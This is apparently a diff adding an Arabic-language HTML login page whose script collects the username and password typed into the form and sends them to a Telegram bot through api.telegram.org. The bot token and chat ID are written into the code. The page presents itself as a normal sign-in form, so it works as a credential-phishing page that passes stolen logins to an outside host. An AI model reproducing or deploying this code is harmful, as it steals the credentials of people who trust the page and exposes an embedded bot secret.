@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة تسجيل الدخول</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-container {
+            background-color: #fff;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            width: 300px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #007BFF;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>تسجيل الدخول</h2>
+        <input type="text" id="username" placeholder="اسم المستخدم" required>
+        <input type="password" id="password" placeholder="كلمة المرور" required>
+        <button onclick="sendData()">تسجيل الدخول</button>
+    </div>
+
+    <script>
+        function sendData() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const userIP = '123.123.123.123';  // استبدال هذا بعنوان الـ IP الحقيقي
+
+            if (!username || !password) {
+                alert('يرجى ملء جميع الحقول');
+                return;
+            }
+
+            const message = `IP: ${userIP}, Username: ${username}, Password: ${password}`;
+            
+            const botToken = '7689597758:AAGZ0johfFl4xt8rjgspFmwiC2HHcj3rTDc'; // ضع هنا Token البوت
+            const chatId = '1632360717'; // ضع هنا chat_id الخاص بك
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert('تم إرسال البيانات بنجاح!');
+                    } else {
+                        alert('فشل في إرسال البيانات');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('حدث خطأ');
+                });
+        }
+    </script>
+</body>
+</html>
